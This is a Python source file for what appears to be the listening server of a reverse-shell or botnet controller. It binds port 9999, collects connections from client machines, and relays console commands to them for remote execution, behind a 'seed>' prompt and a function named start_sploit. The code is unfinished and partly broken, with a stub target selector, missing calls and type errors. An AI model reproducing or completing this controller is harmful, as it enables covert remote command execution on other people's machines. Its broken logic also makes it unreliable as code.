import socket
import sys
import threading
import time
from queue import Queue

#variables
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connection = []
all_address = []

#creating socket

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error : "+str(msg))

#Bind socket to port
def socket_binding():
    try:
        global host
        global port
        global s

        print("Binding socket to port "+str(port))
        print("Server is listning...")
        #bind port to server
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print(str(msg)+" Trying... ")
        socket_binding()

#Accept socket connection throught port
def socket_accept():
    conn, address = s.accept()
    print("Connection is established! IP : " + str(address[0]) + "|" + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        #getting user input via keyboard
        cmd = input()
        #Close all connections if user type quit in console
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        #if client issue word more than 0
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def accept_connection():
    #close all curently available connections
    for c in all_connection:
        c.close

    del all_connection[:]
    del all_address[:]
    while 1 :
        try:
            conn,address = s.accept()
            conn.setblocking(1)

            all_connection.append(conn)
            all_address.append(address)
            print("\nConnection has Established: "+address[0])

        except:
            print("Error Accepting connection")



def start_sploit():
    cmd = input("seed>")

    if cmd == "list":
        list_connections()
    elif 'select' in cmd:
        conn = get_target()
        #if conn is not None:
            #send_target_commands(conn)
    else:
        print("Command not recognized!!")

def list_connections():
    results = ''
    for i, conn in enumerate(all_connection):
        try:
            conn.send(str.encode(i))
            conn.recv(20480)
        except:
            del all_connection[i]
            del all_address[i]
            continue
        results += str(i)+' '+str(all_address[i][0]+' '+all_address[i][1]+'\n')

    print("-----CLIENTS----- \n" + results)

def get_target():
    print('GET TARGET')




def main():
    socket_create()
    socket_binding()



main()